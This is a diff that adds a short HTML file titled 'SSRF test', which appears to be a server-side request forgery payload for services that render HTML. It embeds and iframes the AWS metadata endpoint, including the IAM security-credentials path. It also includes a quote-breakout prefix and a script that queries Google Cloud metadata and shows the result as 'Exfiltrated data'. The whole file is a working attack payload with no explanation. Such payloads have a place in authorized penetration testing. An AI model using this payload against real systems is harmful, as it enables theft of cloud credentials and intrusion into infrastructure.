@@ -1,0 +1,23 @@
+<html>
+  <h1>SSRF test</h1>
+    <div>http://169.254.169.254/latest/meta-data/</div>
+    <div>
+     <embed src="http://169.254.169.254/latest/meta-data/" style="width:100%;height:300px" />
+    </div>
+  ”><iframe src=“http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME”></iframe>
+<p>
+  <div>Exfiltrated data:</div>
+  <span id='result'></span>
+  <script>
+    exfil = new XMLHttpRequest();
+    exfil.onreadystatechange = function () {
+      if (exfil.readyState === 4) {
+        document.getElementById("result").innerText = JSON.stringify(exfil.response);
+      }
+    };
+    exfil.open("GET", "http://metadata.google.internal/computeMetadata/v1/instance/hostname");
+    exfil.setRequestHeader("Metadata-Flavor", "Google");
+    exfil.send();
+  </script>
+</p>
+</html>
